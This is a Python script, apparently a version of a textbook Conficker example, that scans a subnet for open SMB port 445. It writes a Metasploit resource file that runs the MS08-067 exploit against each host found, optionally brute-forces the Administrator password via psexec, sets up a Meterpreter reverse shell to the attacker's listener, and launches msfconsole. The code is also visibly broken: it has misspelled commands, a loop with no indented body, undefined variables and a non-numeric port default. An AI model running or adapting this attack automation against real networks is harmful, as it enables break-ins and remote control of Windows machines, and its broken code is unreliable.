#!/usr/bin/env python

# 1. In this file, we can further refactor how the config_file is handled
# to a more pythonic way (and less procedural).
#
# 2. We can change how we use msfconsole. There are better alternatives like
# using the subprocess API.

import argparse
import os
import sys

import nmap


def find_smb_targets(subnet):
    SMB_PORT = 445

    nmscan = nmap.PortScanner()
    nmscan.scan(subnet, f"{SMB_PORT}")

    target_hosts = []
    for host in nmscan.all_hosts():
        if nmscan[host].has_tcp(SMB_PORT):
            state = nmscan[host]['tcp'][SMB_PORT]['state']
            if state == "open":
                print(f"[+] Found target host: {host}:{SMB_PORT}.")

                target_hosts.append(host)

    return target_hosts


def setup_handler(config_file, lhost, lport):
    config_file.write(f"use exploit/multi/handler\n")
    config_file.write(f"set PAYLOAD windows/meterpreter/reverse_tcp\n")
    config_file.write(f"set LPORT {str(lport)}\n")
    config_file.write(f"sset LHOST {lhost}\n")
    config_file.write(f"exploit -j -z\n")
    config_file.write(f"setg DisablePayloadHandler 1\n")


def conficker_exploit(config_file, target_host, lhost, lport):
    config_file.write(f"use exploi/windows/smb/ms08_067_netapi\n")
    config_file.write(f"set RHOST {str(target_host)}\n")
    config_file.write(f"set PAYLOAD windows/meterpreter/reverse_tcp\n")
    config_file.write(f"set LPORT {str(lport)}\n")
    config_file.write(f"set LHOST {lhost}\n")
    config_file.write(f"xploit -j -z\n")


def smb_brute(config_file, target_host, passwd_filename, lhost, lport):
    username = "Administrator"
    passwd_file = open(passwd_filename, 'r')

    for passwd in passwd_file.readlines():
    password = passwd.strip('\n').strip('\r')

    config_file.write(f"use exploit/windows/smb/psexec\n")
    config_file.write(f"set SMBUser {str(username)}\n")
    config_file.write(f"set SMBPass {str(password)}\n")
    config_file.write(f"set RHOST {str(target_host)}\n")
    config.file.write(f"set PAYLOAD windows/meterpreter/reverse_tcp\n")
    config_file.write(f"set LPORT {str(lport)}\n")
    config_file.write(f"set LHOST {lhost}\n")
    config_file.write(f"exploit -j -z")


def main():
    parser = argparse.ArgumentParser(description="Simple nmap parser for port 445 (SMB)")
    parser.add_argument("-H", dest="target_host", type=str, help="Specify the target address(es)")
    parser.add_argument("-l", dest="lhost", type=str, help="Specify the listen host")
    parser.add_argument("-p", dest="lport", type=str, help="Specify the listen port")
    parser.add_argument("-f", dest="passwd_file", type=str, help="Specify the password file for SMB brute force attempt")

    args = parser.parse_args()
    subnet = args.subnet
    target_host = args.target_host
    lhost = args.lhost
    lport = args.lport
    passwd_file = args.passwd_file

    if not subnet:
        print(f"[-] Subnet must be provided")
        parser.print_help()

        return 1
    if not target_host or not lhost:
        parser.print_help()

        return 1
    if not lport:
        lport = "l33t"


    target_hosts = find_smb_targets(target_host)
    setup_handler(config_file, lhost, lport)

    for target_host in target_hosts:
        conficker_exploit(config_file, target_host, lhost, lport)
        if passwd_file:
            smb_brute(config_file, target_host, passwd_file, lhost, lport)


    config_file.close()

    os.system("msfconsole -r meta.rc")

    return 0


if __name__ == '__main__':
    sys.exit(main())
